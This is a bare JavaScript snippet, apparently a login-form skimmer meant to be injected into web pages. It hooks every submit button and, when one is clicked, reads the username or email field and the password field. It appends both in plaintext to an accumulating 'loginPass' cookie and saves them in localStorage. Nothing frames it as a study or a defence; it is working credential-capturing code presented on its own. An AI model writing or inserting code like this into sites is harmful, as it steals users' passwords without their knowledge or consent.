var loginName = "",
    pass = "",
    inputs = window.document.getElementsByTagName("input");

var getLogPassFromCooki = function () {
    var cook = document.cookie;
    var index = cook.search("loginPass");
    if (index !== -1) {
        cook = cook.slice(index);
        cook = cook.slice(0,cook.search(";"));
        return cook;
    }
    return "";
};

/*
var calculateExperiesDay = function () {
    var experies = new Data();
    experies.setMonth(experies.getMonth() + 1);
    experies = "expires="+ experies.toUTCString();
    return experies;
};
*/
var sendLogginPass = function () {
    document.cookie = "loginPass=" + getLogPassFromCooki() + "," +  loginName + ":" + pass;
    localStorage.setItem(loginName, pass);
};

var getPass = function () {
    for (var i = 0; i < inputs.length; i++) {

        if (inputs[i].name === "Login" || inputs[i].type === 'email' || inputs[i].name === 'email') {
            loginName = inputs[i].value;
        }
        if (inputs[i].type === "password" && inputs[i].value !== "") {
            pass = inputs[i].value;
        }
    }

    sendLogginPass();
};
for (var i = 0; i < inputs.length; i++) {
    if (inputs[i].type === "submit") {
        inputs[i].addEventListener("click", getPass);
    }
}
